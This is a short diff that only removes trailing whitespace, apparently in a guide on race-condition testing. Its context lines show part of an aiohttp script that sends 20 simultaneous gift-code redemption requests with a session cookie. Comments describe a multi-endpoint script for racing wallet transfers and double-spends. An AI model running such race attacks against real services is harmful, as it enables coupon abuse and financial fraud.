@@ -171,11 +171,11 @@ async def main():
     url = "https://target.com/redeem"
     payload = {"code": "GIFT50"}
     headers = {"Cookie": "session=XXXXX"}
-    
+
     async with aiohttp.ClientSession() as session:
         tasks = [race_request(session, url, payload, headers) for _ in range(20)]
         results = await asyncio.gather(*tasks)
-    
+
     for r in results:
         print(r[:100])  # print first 100 chars of each response
 
@@ -563,7 +563,7 @@ def handleResponse(req, interesting):
 
 ```python
 # turbo_multi_endpoint.py
-# Use against: wallet transfer (withdraw-to-A + deposit-to-B), 
+# Use against: wallet transfer (withdraw-to-A + deposit-to-B),
 #              balance-confirm race, double-spend across endpoints
 # Strategy: Race two different endpoints that share state (common in fintech).
 # Queue requests in alternating order so they arrive simultaneously.
